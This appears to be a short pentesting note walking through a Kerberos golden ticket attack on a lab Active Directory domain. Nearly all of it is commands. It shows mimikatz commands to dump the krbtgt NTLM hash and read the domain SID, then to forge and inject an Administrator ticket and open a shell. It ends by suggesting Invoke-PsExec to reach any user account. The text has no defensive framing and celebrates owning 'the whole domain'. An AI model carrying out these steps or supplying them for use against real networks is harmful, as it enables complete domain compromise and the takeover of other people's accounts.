- - -

## What is this ? :
If this attack is successful that means we have completly compromised the **entire Domain**.

- - -

## Attacking Steps : 

```cmd
mimikatz.exe
mimicatz # lsadump::lsa /inject /name:krbtgt
```

Open your notes/note-pad and....
- [ ] Copy the **SID** of the Domain.
![Imgur](https://i.imgur.com/SdDrRI5.png)

- [ ] Copy the **NTLM** hash.
![Imgur](https://i.imgur.com/t9ZJX0t.png)

```cmd
mimicatz # kerberos::golden /User:Administrator /domain:marvel.local /sid:<Doamin-SID> /krbtgt:<Doamin-Hash> /id:500 /ptt
```

![Imgur](https://i.imgur.com/lJGc3NY.png)

```
mimicatz # misc::cmd
```

![Imgur](https://i.imgur.com/uBYTFz5.png)

###### NOW THE WHOLE DOAMIN IS OURS !!
now Go ahead and download
[Invoke-PsExec](https://github.com/EliteLoser/Invoke-PsExec) to access any user account you want from this **cmd**.

- - -

